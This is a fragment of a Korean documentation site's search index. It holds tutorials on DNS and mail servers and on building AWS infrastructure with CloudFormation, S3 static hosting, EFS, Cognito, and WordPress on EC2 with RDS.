및 구동하게 하며, 사용자와의 편리한 의사소통을 위해만들어진 다양한 프로그램들이 구동될 수 있도록 하는 소프트웨어 플랫폼이다.\n  대표적으로 안드로이드와 iOS가 있다.\n  리눅스 기반의 공개형 운영체제로 마에모, 모블린, 미고, 리모, 타이벤, iOS 가 있다.\n       스마트TV   텔레비전에 인터넷 접속 기능이 결합되어, 각종 애플리케이션을 설치하여 TV방송 시청이외의 다양한 기능을 활용할 수 있는 다기능 TV이다.\n  인터넷 TV 또는 커넥티드 TV라고도 불린다.\n       IVI(In Vehicle Infotainment)   인포테인먼트란 정보와 오락의 합성어로 정보전달에 오락성을 가미한 시스템이다.\n  내비게이션이나 계기판, AV 시스템, DMB, MP3, 오디오 및 외부 기기와의 연결까지 가능한통합적인 차량 내부 시스템을 포함한다.\n  GENIVI 표준 플랫폼 기반의 인포테인먼트 시스템이다.\n  운전자 편의성 및 안전성을 증대시킨다.\n  GENIVI(GENEVA In Vehicle Infotainment)는 오픈 소스 기반 플랫폼 얼라이언스로 차량 멀티미디어 플랫폼 표준화 활동이다.\n      "}),a.add({id:243,href:'/docs/system/linux/ls02/',title:"서버도입",content:"Linux Server Management   DNS 서버    DNS(Domain Name Server)는 TCP/IP 네트워크에서 이름 해석 서비스를 제공하는 서버 애플리케이션으로 이름 해석이란 호스트 이름과 도메인 이름을 IP 주소로 변환하는, 혹은 반대로 IP 주소에서 호스트 이름이나 도메인 이름으로 변환하는 작업이다.\n  DNS 서버는 자신의 도메인 정보를 관리하고 외부 DNS 서버의 문의에 대응하는 기능을 수행하며, DNS 서버가 관리하는 도메인의 범위를 영역(Zoen)이라 한다.\n   Domain 이름의 기술 형식    도메인 이름 : 서브도메인 이름 또는 공백\n  서브 도메인 이름 : 레이블 또는 서브도메인 이름.레이블\n  레이블 : 문자, 숫자, 하이픈, 스티링, 문자 및 숫자\n  문자 숫자 하이픈 스트링 :\n  문자 숫자 하이픈\n  또는\n  문자 숫자 하이픈 문자 숫자 하이픈 스트링\n  문자 숫자 하이픈 : 문자 숫자 또는 -(하이픈)\n  문자 숫자 : 문자 또는 숫자\n  문자 : 52개의 A에서 Z사이의 대소 영문자\n  숫자 : 0~9까지의 숫자들\n      인터넷상에서 IP 패킷의 송수신자는 IP주소로 식별되지만, 애플리케이션인 메일이나 웹에서는 일반적으로 호스트 이름으로 송수신자를 식별한다.\n  웹 브라우저의 경우 \u0026ldquo;http://www.example.com\u0026rdquo; 등으로 서버 이름을 접근하며, 반면에 메일이나 웹 등 데이터를 송신하는 시스템의 IP모듈은 애플리케이션이 지정한 상대편 서버 이름을 이해할 수 없으므로 지정된 서버 이름을 IP 주소로 변환할 필요가 있으며, 이를 DNS의 이름해석이라 한다.\n  DNS 컴포넌트는 이름 해석 서비스를 제공하는 DNS 서버에서 데몬 프로세스로 동작하는 네임 서버와 그 네임 서버가 참조하는 DNS 영역 파일이 존재하며, 반면 이름 해석을 의뢰하는 DNS 클라이언트에는 리졸버가 존재한다.\n  DNS의 구성\n  도메인 이름 공간과 리소스 레코드 : 도메인 구성과 리소스를 정의하는 DNS 영역 파일\n  네임 서버 : 서버의 데몬 프로세스로 동작하는 네임 서버 프로그램\n  리졸버 : 네임 서버에 문의하는 유저 루틴으로 리졸버 구성 파일을 사용\n      이름 해석 과정     Mail Server    메일서버는 우리가 사용하는 메일서버와 동일하며 여기서는 sendmail을 이용하여 서버를 구축한다.\n  이 때 sendmail의 구성 파일인 sendmail.cf는 WIDE 프로젝트의 CF 패키지를 이용해서 작성한다.\n    메일 서버의 구조    메일 서버(smtp/pop3) 설정과 구체적인 메일 송수신 구조를 설정 파일과 연계하여 설명할 수 있으며, 이 글에서 사용하는 메일 서버 소프트웨어는 sendmail이다.\n  메일 클라이언트 소프트웨어(smtp 클라이언트)에서 작성, 송신된 메일을 smtp 서버(메일 서버)는 일단 임시 보관 영역(메일 송신 큐)에 메일을 넣은 다음 전송 처리를 진행한다.\n  메일주소를 보고 서버에 등록된 주소로 보내는 메일이면 계정별 메일 보관함으로 전송하며, 외부로 보내는 메일이면 해당 주소 도메인의 smtp 서버로 메일을 전송한다.\n                              "}),a.add({id:244,href:'/docs/aws/awstraining/cloudformation/',title:"AWS CloudFormation",content:"AWS CloudFormation    이번 장에서는 CloudFormation의 탬플릿을 사용하여 서버를 자동 구축되도록 생성해보도록 하겠습니다. CloudFormation의 대한 개념은 CloudFormation을 참고하세요.    CloudFormation을 활용한 자동구축     CloudFormation 아키텍처 예시     먼저, AWS에서 CloudFormation 검색 후 클릭합니다.      스택 생성을 클릭합니다.       스택 생성을 위해 아래의 값을 cloudformation_instance.template 을 생성하여 업로드 합니다. 보통 Templates 파일은 S3에 저장된 것을 사용하지만, 여기서는 로컬환경에서 가져와 사용해보도록 하겠습니다. CloudFormation Templates 참조   { \u0026#34;AWSTemplateFormatVersion\u0026#34; : \u0026#34;2010-09-09\u0026#34;, \u0026#34;Resources\u0026#34;: { \u0026#34;Instance\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;AWS::EC2::Instance\u0026#34;, \u0026#34;Properties\u0026#34;:{ \u0026#34;Monitoring\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;ImageId\u0026#34;: \u0026#34;[ AMI ID ]\u0026#34;, \u0026#34;KeyName\u0026#34;: \u0026#34;[ Key ]\u0026#34;, \u0026#34;InstanceType\u0026#34;: \u0026#34;t2.micro\u0026#34;, \u0026#34;NetworkInterfaces\u0026#34;: [ { \u0026#34;DeviceIndex\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;AssociatePublicIpAddress\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;DeleteOnTermination\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;SubnetId\u0026#34;: \u0026#34;[ 서브넷 ID ]\u0026#34;, \u0026#34;GroupSet\u0026#34;: [\u0026#34;[ 보안 그룹 ]\u0026#34;] } ] } } }, \u0026#34;Description\u0026#34;: \u0026#34;SampleInstance\u0026#34; }   CloudFormation 기본형식  { \u0026#34;AWSTemplateFormatVersion\u0026#34; : \u0026#34;version date\u0026#34;, \u0026#34;Description\u0026#34; : \u0026#34;JSON string\u0026#34;, \u0026#34;Parameters\u0026#34;: { set of parameters }, \u0026#34;Mappings\u0026#34;: { set of mappings }, \u0026#34;Conditions\u0026#34;: { set of conditions }, \u0026#34;Resources\u0026#34;: { set of resources }, \u0026#34;Outputs\u0026#34;: { set of outpus } }     옵션 설명     AWSTemplateFormatVersion 템플릿의 버전   Description 템플릿의 대한 설명 ( 시스템이 읽지 않음 )   Parameters 스택 생성 때에 전달할 값, 탬플릿 내부에서 Ref 함수로 참조   Mappings 해시 테이블처럼 키에 따라 값을 지정할 수 있으며, 리전마다 사용할 AMI를 다르게 하는 경우 등의 사용   Conditions 조건을 판단, 조건에 일치하는 경우 실행할 리소스를 지정할 수 있음   Resources 생성할 자원을 정의, EC2 인스턴스, 보안 그룹 등의 생성할 자원 유형을 지정하고 설정 ( 아직 모든 서비스를 이용할 수는 없음 )   Outputs 탬플릿으로 생성한 결과를 출력         업로드가 완료되면, 스택의 이름을 지정합니다.      스택 옵션 구성에서는 IAM 역할, 그 외에도 스택의 정책과 옵션들을 구성할 수 있습니다. 여기에서는 기본 값으로 진행하겠습니다.      스택의 생성이 완료되면, 그림과 같이 상태에서 로그를 확인하실 수 있습니다. 생성이 완료되면 인스턴스가 생성된 것을 확인 할 수 있습니다.     CloudFormation 업데이트    이번에는 생성된 Stack을 업데이트 하는 방법에 대해 알아보도록 하겠습니다.    먼저, 위에서 생성한 Stack \u0026gt; 업데이트를 클릭합니다.      스택 업데이트를 클릭하면 현재 템플릿을 사용하면서 스택의 옵션만 바꿀건지, 혹은 탬플릿 자체를 변경할 것인지에 대한 옵션이 나옵니다. 저희는 탬플릿 자체에 대한 옵션을 바꾸기 위해 기존 templates 파일을 아래와 같이 수정하여 업데이트 하도록 하겠습니다. Designer 편집기에서 추가하셔도 상관은 없습니다.  { \u0026#34;AWSTemplateFormatVersion\u0026#34; : \u0026#34;2010-09-09\u0026#34;, \u0026#34;Resources\u0026#34;: { \u0026#34;Instance\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;AWS::EC2::Instance\u0026#34;, \u0026#34;Properties\u0026#34;:{ \u0026#34;Monitoring\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;ImageId\u0026#34;: \u0026#34;ami-01af223aa7f274198\u0026#34;, \u0026#34;KeyName\u0026#34;: \u0026#34;Study\u0026#34;, \u0026#34;InstanceType\u0026#34;: \u0026#34;t2.micro\u0026#34;, \u0026#34;NetworkInterfaces\u0026#34;: [ { \u0026#34;DeviceIndex\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;AssociatePublicIpAddress\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;DeleteOnTermination\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;SubnetId\u0026#34;: \u0026#34;subnet-463b3d0a\u0026#34;, \u0026#34;GroupSet\u0026#34;: [\u0026#34;sg-f553af91\u0026#34;] } ], \u0026#34;UserData\u0026#34;: { \u0026#34;Fn::Base64\u0026#34; : { \u0026#34;Fn::Join\u0026#34; : [\u0026#34;\u0026#34;, [ \u0026#34;#!/bin/bash\\n\u0026#34;, \u0026#34;yum update -y\\n\u0026#34;, \u0026#34;yum install -y httpd\\n\u0026#34;, \u0026#34;service httpd start\\n\u0026#34;, \u0026#34;chkconfig httpd on\\n\u0026#34; ]] } } } } }, \u0026#34;Description\u0026#34;: \u0026#34;SampleInstance\u0026#34; }     탬플릿 업로드 후, 위와 동일하게 생성하면 보기와 같이 업데이트를 확인하실 수 있습니다.      생성된 인스턴스로 접속하면, Apache가 설치되어 있는 것을 확인하실 수 있습니다.     CloudForamtion 파라미터 설정    위에서는 고정 값으로 스택을 생성했지만, 만약 고정 값으로 생성을 진행할 경우, 에러가 발생할 수 있으며, 여러 탬플릿을 생성해야하는 번거로움이 존재합니다. 이번에는 파라미터 값을 설정하여 CloudFormation을 사용하는 방법에 대해 알아보도록 하겠습니다.    먼저 위에서 생성한 템플릿을 Parameter 값을 사용하도록 수정하여 보겠습니다.  { \u0026#34;AWSTemplateFormatVersion\u0026#34; : \u0026#34;2010-09-09\u0026#34;, \u0026#34;Parameters\u0026#34;: { \u0026#34;ImageId\u0026#34; : { \u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;Default\u0026#34;: \u0026#34;ami-01af223aa7f274198\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;IamgeId\u0026#34; }, \u0026#34;KeyName\u0026#34; : { \u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;Default\u0026#34;: \u0026#34;Study\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;Keypair name\u0026#34; }, \u0026#34;InstanceType\u0026#34; : { \u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;Default\u0026#34;: \u0026#34;t2.micro\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;InstanceType\u0026#34; }, \u0026#34;AssociatePublicIpAddress\u0026#34; : { \u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;Default\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;PublicIP\u0026#34;, \u0026#34;AllowedValues\u0026#34;: [\u0026#34;true\u0026#34;, \u0026#34;false\u0026#34;] }, \u0026#34;DeleteOnTermination\u0026#34; : { \u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;Default\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;DeleteOnTermination\u0026#34;, \u0026#34;AllowedValues\u0026#34;: [\u0026#34;true\u0026#34;, \u0026#34;false\u0026#34;] }, \u0026#34;SubnetId\u0026#34; : { \u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;Default\u0026#34;: \u0026#34;subnet-463b3d0a\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;SubnetId\u0026#34; }, \u0026#34;GroupSet\u0026#34; : { \u0026#34;Type\u0026#34;: \u0026#34;String\u0026#34;, \u0026#34;Default\u0026#34;: \u0026#34;sg-f553af91\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;GroupSet\u0026#34; } }, \u0026#34;Resources\u0026#34;: { \u0026#34;Instance\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;AWS::EC2::Instance\u0026#34;, \u0026#34;Properties\u0026#34;:{ \u0026#34;Monitoring\u0026#34;: \u0026#34;false\u0026#34;, \u0026#34;ImageId\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;ImageId\u0026#34; }, \u0026#34;KeyName\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;KeyName\u0026#34; }, \u0026#34;InstanceType\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;InstanceType\u0026#34; }, \u0026#34;NetworkInterfaces\u0026#34;: [ { \u0026#34;DeviceIndex\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;AssociatePublicIpAddress\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;AssociatePublicIpAddress\u0026#34; }, \u0026#34;DeleteOnTermination\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;DeleteOnTermination\u0026#34; }, \u0026#34;SubnetId\u0026#34;: { \u0026#34;Ref\u0026#34; : \u0026#34;SubnetId\u0026#34; }, \u0026#34;GroupSet\u0026#34;: [{ \u0026#34;Ref\u0026#34; : \u0026#34;GroupSet\u0026#34; }], } ], \u0026#34;UserData\u0026#34;: { \u0026#34;Fn::Base64\u0026#34; : { \u0026#34;Fn::Join\u0026#34; : [\u0026#34;\u0026#34;, [ \u0026#34;#!/bin/bash\\n\u0026#34;, \u0026#34;yum update -y\\n\u0026#34;, \u0026#34;yum install -y httpd\\n\u0026#34;, \u0026#34;service httpd start\\n\u0026#34;, \u0026#34;chkconfig httpd on\\n\u0026#34; ]] } } } } }, \u0026#34;Description\u0026#34;: \u0026#34;SampleInstance\u0026#34; }  특정 리소스 값들은 파라미터 값에서 가져오는 방식으로 수정하였습니다. 위와 같이 설정을 마친 후, 동일하게 스택의 생성을 진행해봅니다.      템플릿을 업로드 후 동일하게 진행합니다.      하지만 전과는 다르게 수정한 파라미터 값들을 선택하거나 기입하는 선택란이 추가되었습니다. 기본적으로 Default 값들을 출력하며, AllowedValues 값이 존재할 시 그 값들만을 선택가능합니다.      생성이 완료되었습니다. 이와 같이 파라미터 값을 사용하면 보다 편리하게 서비스들의 구현이 가능합니다.     예제 1. 다음의 탬플릿을 생성해보세요.  VPC를 생성하고, 3개의 서브넷이 모두 인터넷 게이트웨이로 연결되게 생성하는 템플릿을 생성하세요.   예제 2. 다음의 탬플릿을 생성해보세요.  웨어 생성한 VPC의 서브넷을 선택해 생성이 가능하도록 인스턴스를 만들고, userdata를 통해 인스턴스의 8080으로 바로 접속이 가능하게 tomcat을 설치해주세요.  "}),a.add({id:245,href:'/docs/aws/awstraining/noserver/',title:"AWS 서버리스 사이트 구축",content:"AWS 서버리스 사이트 구축    이번 장에서는 S3를 통해 서버가 없는 정적인 사이트를 구현해보도록 하겠습니다. 이와 같이 서버리스의 가장 큰 특징은 EC2처럼 상시 실행 상태 중이 아니여도, 사용자가 요청시에만 실행이 가능하기 때문에 비용면과 운영면에서 효율적이라 할 수 있습니다. AWS에서는 S3에서 웹 호스팅 기능을 제공하고 있어, 이를 통해 구현해보도록 하겠습니다.    AWS 서버리스 사이트 구축      먼저, AWS에 접속하여 S3 서비스를 검색 후, 클릭합니다.      S3를 시작하기 위해 버킷을 생성합니다.      버킷의 이름을 지정하고, 리전을 선택합니다.      기본 값으로 설정을 진행합니다.      단, 그림과 같이 퍼블릭 엑세스의 대한 차단을 해제합니다.      버킷의 생성이 완료되었습니다.      다음으로는 생성된 버킷을 호스팅 등록하기 전에, 버킷의 정책을 먼저 생성하겠습니다. 버킷의 생성이 완료되면, 생성된 버킷을 클릭합니다. 생성된 버킷에서 권한 -\u0026gt; 버킷 정책을 클릭 후, 하단의 정책 생성기를 클릭합니다.      그림은 정책생성기로, 원하는 정책옵션을 선택하면 그 옵션을 Json파일로 변환시켜주는 역할을 수행합니다. 여기서는 아래의 값으로 설정을 진행합니다.   Select Type : S3 Bucket Policy\nPrincipal : \u0026quot; * \u0026ldquo; ( Principal는 리소스로의 접근을 허가 또는 거부할 사용자, 계정, 서비스, 엔티티를 나타냅니다.) Actions : GetObject ( Actions는 허가할 조작을 나타냅니다.)\nARN : arn:aws:s3::: [ 버킷 이름 ]/[ Key_name ] ( 허용할 파일 혹은 디렉토리를 나타냅니다. 여기서 /Key_name은 /*을 사용합니다. )\n     생성 후, Add Statement를 클릭하면 현재 선택한 옵션들은 Json 형식으로 바꾸어 줍니다.  { \u0026#34;Id\u0026#34;: \u0026#34;Policy1593408879908\u0026#34;, \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Sid\u0026#34;: \u0026#34;Stmt1593408870453\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;s3:GetBucketObjectLockConfiguration\u0026#34; ], \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:s3:::s3-serverless-web/*\u0026#34;, \u0026#34;Principal\u0026#34;: \u0026#34;*\u0026#34; } ] }     다음은 미리 index.html과 error.html 파일을 업로드 하겠습니다.      위의 그림과 같이 파일을 업로드 합니다. 모든 설정은 기본 값으로 설정합니다.      이제, 호스팅을 위해 S3에서 정적 웹 사이트 호스팅을 설정하겠습니다. S3의 속성 -\u0026gt; 정적 웹 사이트 호스팅을 선택합니다.      정적 웹 사이트 호스팅 창이 나오면 인덱스 문서 및 오류 문서의 업로드한 파일을 기입 후 저장합니다.      이제 S3 EndPoint로 접속하면 index.html을 확인할 수 있습니다. 또한 에러 발생시에는 error.html이 보여지는 것을 확인할 수 있습니다.    이제 이것으로 기본적인 S3를 사용한 정적사이트 구축이 완료되었습니다. 이어서 서비스와 기능을 추가시켜보도록 하겠습니다.     AWS 서버리스 사이트 세부설정   Redirection Rules   Redirection Rules란 특정 경로 또는 HTTP 오류 코드 등의 조건에 따라 라우팅을 지정해주는 기능입니다.     \u0026lt;RoutingRules\u0026gt; \u0026lt;RoutingRule\u0026gt; \u0026lt;Condition\u0026gt; \u0026lt;KeyPrefixEquals\u0026gt;hello/\u0026lt;/KeyPrefixEquals\u0026gt; \u0026lt;/Condition\u0026gt; \u0026lt;Redirect\u0026gt; \u0026lt;ReplaceKeyPrefixWith\u0026gt;bye/\u0026lt;/ReplaceKeyPrefixWith\u0026gt; \u0026lt;/Redirect\u0026gt; \u0026lt;/RoutingRule\u0026gt; \u0026lt;/RoutingRules\u0026gt; # KeyPrefixEquals로 진입한 트래픽을 ReplaceKeyPrefixWith로 진입시킵니다.  Redirection Rules의 설정을 위해 다시 정적 웹 사이트 호스팅 설정을 클릭합니다. 후 위의 값을 리디렉션 규칙에 작성합니다. 위 설정을 마치면 Endpoint에 hello로 진입시 bye로 진입되는 것을 확인 할 수 있습니다.     \u0026lt;RoutingRules\u0026gt; \u0026lt;RoutingRule\u0026gt; \u0026lt;Condition\u0026gt; \u0026lt;HttpErrorCodeReturnedEquals\u0026gt;404\u0026lt;/HttpErrorCodeReturnedEquals\u0026gt; \u0026lt;/Condition\u0026gt; \u0026lt;Redirect\u0026gt; \u0026lt;ReplaceKeyWith\u0026gt;index.html\u0026lt;/ReplaceKeyWith\u0026gt; \u0026lt;/Redirect\u0026gt; \u0026lt;/RoutingRule\u0026gt; \u0026lt;/RoutingRules\u0026gt; # HttpErrorCodeReturnedEquals는 특정 에러가 발생하면 에러를 보여주는 대신 ReplaceKeyWith 값을 보여줍니다.  이와 동일하게 위의 값을 다시 리디렉션 규칙에 작성합니다. 설정을 마치면, Endpoint/의 모든 Null 값이 index.html로 옮겨지는 것을 확인할 수 있습니다.      차후 Lmabda, DNS, CDN 서비스를 추가하여 업데이트 하겠습니다.  DNS 설정                                              "}),a.add({id:246,href:'/docs/aws/awstraining/ebs/',title:"정리 중",content:"AWS Elastic Fire System    EFS      AWS 서비스에서 EFS를 클릭합니다.      스토리지 생성을 위해 파일 시스템 생성을 클릭합니다.      네트워크 엑세스를 구성합니다. 여기서는 기본 VPC에서 가용영역 a, c를 사용하겠습니다.      파일 시스템 설정 구성을 설정합니다. 여기서는 후에 설정을 전부 기본 값을 사용하여 생성합니다.      생성된 내용을 확인합니다.      EFS 사용하기 위해 가용영역 a, c에 인스턴스를 생성합니다.     $ yum install make git binutils\r$ git clone https://github.com/aws/efs-utils\r$ cd efs-utils\r$ ./build-deb.sh\r$ cd build\r$ yum install -y ./amazon-efs-utils-1.5-1.deb\r$ yum install -y install nfs-common\r 패키지들을 설치합니다.                          "}),a.add({id:247,href:'/docs/aws/awstraining/cognito/',title:"AWS Cognito",content:"AWS Cognito    AWS Cognito      Cognito는 기본적으로 모바일에서 인증을 진행 후, 인증 혹은 비인증에 해당하는 리소스에 대한 사용 권한을 부여 받는 형식으로 진행됩니다.      Cognito 서비스 사용을 위해서 먼저, AWS에 접속하여 Cognito를 검색합니다. Cognito에 대한 개념은 Cognito를 참고하세요.      Cognito의 메인 페이지에서 \u0026gt; 자격 증명 풀 관리를 클릭합니다.      새 자격 증명 풀을 생성합니다. 인증되지 않은 자격 증명은 비인증 사용자에 대한 엑세스 권한을 설정하는 옵션입니다. 인증 공급자는 사용자의 인증을 확인해 OpenID Connect 기반의 프로바이저입니다.      생성이 완료되면 새로운 IAM 권한을 생성하고 허용합니다.      이제 다시 풀 관리로 진입하면, 생성된 풀의 확인이 가능합니다. 생성한 풀을 선택하여 해당 풀에 진입합니다.      풀에 대한 자격증명을 편집합니다.     AWS Mobile SDK   이제 다음으로 AWS Mobile SDK에 대한 사용방법을 알아보도록 하겠습니다. AWS Moblie SDK 참조 핸드폰의 기종에 맞춰 안드로이드 스튜디오 혹은 Xcode를을 준비해주세요. 여기서는 Vmware의 Mac환경을 설치하여 진행하도록 하겠습니다. VMware Mac 환경설치   $ sudo gem install bundler $ sudo gem install cocoapods $ pod setup # CocoaPods 라이브러리를 설치합니다. $ git clone https://github.com/awslabs/aws-sdk-ios-samples.git $ Samples 코드를 다운 받습니다. $ cd [ 다운로드 경로 ]/S3TransferManager-Sample/Objective-C $ cat Podfile # 해당 디렉토리로 이동하여 Podfile을 확인합니다. Podfile은 프로젝트에 필요한 라이브러리를 작성하는 파일입니다. $ pod install # Podfile의 작성되어 있는 라이브러리들을 설치합니다.  AWS Mobile SDK을 사용하기 위한 환경을 구현합니다.      설치가 완료되면 Xcode를 실행합니다. 단, .xcodeproj가 아닌 .xcworkspace파일을 실행해야 합니다.     #import \u0026lt;Foundation/Foundation.h\u0026gt; NSString *const AWSAccountID = @\u0026#34;Your-AccountID\u0026#34;; NSString *const CognitoPoolID = @\u0026#34;Your-PoolID\u0026#34;; NSString *const CognitoRoleUnauthID = @\u0026#34;Your-RoleUnauthID\u0026#34;; NSString *const CognitoRoleAuth = @\u0026#34;Your-RoleID\u0026#34;; NSString *const S3BucketName = @\u0026#34;Your-S3-Bucket-Name\u0026#34;;  Constant.m 파일을 편집합니다.                  예제 1. 다음의 인스턴스를 생성해보세요.  \r예제 1. 답안\r↕\r\r 사용자 계정을 생성할 시, 엑세스 유형에서 프로그래밍 방식 엑세스만을 선택합니다. 정책에서 admin의 권한을 선택 후 생성합니다.  \r\r\r "}),a.add({id:248,href:'/docs/aws/awstraining/ec2site/',title:"EC2 동적 사이트 구축",content:"EC2 동적 사이트 구축    이번 장에서는 EC2와 WordPress, RDS를 활용해 동적 사이트를 구축해보겠습니다. 이 장에서는 RDS 복제본 사용시 과금이 청구될 수 있습니다. 이를 원치 않는 분들은, RDS 설정 시, Multi-AZ 설정을 하지 않고, 1개의 Master RDS만 생성 후 진행하세요.\r\r    EC2 동적 사이트 구축       VPC     VPC 이름 IPv4 CIDR     VPC-WordPress 10.0.0.0/16      Subnet     Subnet 이름 VPC AZ IPv4 CIDR     WordPress-Public-Subnet VPC-WordPress ap-northeast-a 10.0.1.0/24   WordPress-Public-Subnet2 VPC-WordPress ap-northeast-c 10.0.2.0/24   RDS-Private-Subnet VPC-WordPress ap-northeast-a 10.0.11.0/24   RDS-Private-Subnet2 VPC-WordPress ap-northeast-c 10.0.12.0/24      Routing Table     Routing Table 이름 VPC Subnet     Public-rt VPC-WordPress WordPress-Public-Subnet, WordPress-Public-Subnet2   Private-rt VPC-WordPress RDS-Private-Subnet, RDS-Private-Subnet2      보안 그룹     보안 그룹 이름 VPC 인 바운드 규칙 아웃 바운드 규칙      WordPress-sg VPC-WordPress SSH : 22/TCP : 0.0.0.0/24, HTTP : 80/TCP : 0.0.0.0/24 모든 트래픽 : 0.0.0.0/0    RDS-sg VPC-WordPress WordPress-sg, 3306/TCP : WordPress-sg 모든 트래픽 : 0.0.0.0/0       먼저 위의 아키텍처와 표와 같이 VPC와 서브넷을 생성해주세요. 인터넷 게이트 생성 후, VPC에 연결하세요. 모든 라우팅 테이블의 게이트웨이는 인터넷 게이트웨이로 지정해주세요. VPC 사용자 정의 VPC 생성     EC2를 활용한 동적 사이트 구축    기본적인 설정을 끝마치셨다면, 이제 동적 사이트 아래의 순서에 맞춰 구현해보겠습니다.   1. RDS 생성\n2. 인스턴스 생성\n3. ELB 생성\n    1. RDS 생성   먼저 RDS 서브넷의 생성을 위해, RDS \u0026gt; 서브넷 그룹 \u0026gt; DB 서브넷 그룹을 위와 동일하게 생성합니다.      아래의 형식에 맞춰 RDS를 생성합니다. RDS 설치 참고    기본설정     설정 항목 값     License Model genral-publicl-license   DB Engine Version 5.7.28   DB Instance Class db.t2.micro   Multi-AZ Deployment General Purpose ( SSD )   Allocated Storage 20 GB   DB 인스턴스 식별자 WordPressDB   마스터 사용자 ID, PW root/qwer1234      네트워크 설정     설정항목 값     VPC VPC-WordPress   Subnet Group rds-private   Publicly Accessible no   AZ ap-northeast-2a   VPC Security Groups RDS-sg      백업 설정     설정항목 값     백업 보존 기간 1일   백업 기간 기본 설정 없음      유지 관리설정     설정항목 값     마이너 버전 자동 업그레이드 사용   유지 관리 기간 기본 설정 없음   삭제 방지 삭제 방지 활성화 X      개인 설정 및 이 이외 값을 기본 값을 유지합니다.    2. 인스턴스 생성   다음의 값으로 인스턴스를 생성합니다.      설정 항목 값     AMI Amazon Linux AMI   Instance Type t2.micro   Network VPC-WordPress   Subnet WordPress-Public   Auto-asstign Public Enable   Name WordPress-a   Security Group Wordpress-sg         생성이 완료되면 아래의 미들웨어들을 설치합니다. 유저 이름은 ec2-user입니다.  $ sudo yum install -y php php-mysql php-gd php-mbstring # 관련 미들웨어를 설치합니다. $ sudo yum install -y mysql # mysql을 설치합니다. $ wget -O /tmp/wordpress-4.1-ja.tar.gz https://ko.wordpress.org/wordpress-4.6.1-ko_KR.tar.gz # wordpress-4.6.1...의 파일을 wordpress-4.1-ja.tar.gz의 이름으로 다운받습니다. $ sudo tar zxf /tmp/wordpress-4.1-ja.tar.gz -C /opt # wordpress 압축파일을 /opt에 압축을 해제합니다. $ sudo ln -s /opt/wordpress /var/www/html # 심볼릭 링크를 생성합니다. $ sudo chown -R apache:apache /opt/wordpress # wordpress의 소유 권한을 apache로 수정합니다. $ sudo chkconfig httpd on # httpd가 정상적으로 작동하는 지 체크합니다. $ sudo service httpd start $ httpd 서비스를 시작합니다.     설치가 완료되면 DB 접속을 위한 계정을 생성합니다.  $ mysql -u root -p -h [ RDS Endpoint ] $ password : qwer1234 mysql\u0026gt; create user \u0026#39;wordpress-user\u0026#39;@\u0026#39;%\u0026#39; identified by \u0026#39;wordpress\u0026#39;; mysql\u0026gt; create database wordpress; mysql\u0026gt; grant all privileges on wordpress.* to \u0026#34;wordpress-user\u0026#34;@\u0026#34;%\u0026#34;; mysql\u0026gt; flush privileges;     계정 생성이 완료되었으면, http://인스턴스의 Public IP/wordpress/wp-admin/install.php로 접속합니다.      데이터베이스, 사용자명, 비밀번호에 위에서 생성한 값들을 입력 후, 데이터베이스의 호스트에는 RDS의 엔드포인트 값을 입력합니다.      설치를 실행합니다.      사이트의 제목과 관리자명 등을 설정합니다.      설정이 완료되면, 설정한 계정을 통해 로그인합니다.      Wored Press의 설치가 완료되었습니다.      생성이 완료되면 AMI 이미지를 생성합니다. AMI 이미지를 통해 동일한 인스턴스를 다른 가용영역에 생성합니다.     3. ELB 생성   80/tcp 외부로 ALB를 생성해주세요. ELB 생성 참고      ELB의 DNS로의 접속이 확인되면, 대상그룹 또한 확인합니다.      다음으로는 WordPress의 접속 IP를 변경해보겠습니다. WordPress의 관리자로 접속하여 설정 -\u0026gt; 워드프레스 주소, 사이트 주소를 변경합니다. 워드프레스 주소 : http://[ ALB DNS ]/wordpress 사이트 주소 : http://[ ALB DNS ] ALB에서 Desciption -\u0026gt; Edit stickiness에서 로드밸런서의 쿠키 값을 사용하도록 설정 후, 시간은 1800초로 설정합니다.      이제 마지막으로 WordPress-sg의 80/tcp 포트의 대상을 0.0.0.0/0이 아닌, ALB를 대상으로 설정 및, SSH 접속을 해제하면 모든 설정이 완료됩니다.     Marketplace를 사용   위 처럼 직접 구현하는 방법 외에도 이미 구현되어 있는 AMI를 구입하여 사용하는 방법도있습니다.    위 그림과 같이 Markplace에서 구입이 가능합니다. Marketplace로 구현을 할 경우, 이미 구축되어진 인프라를 사용하는 만큼, 간편하고 빠르게 사용할 수 있지만, 세부적인 사항에 대해서는 설정이 어렵다는 단점이 있습니다.  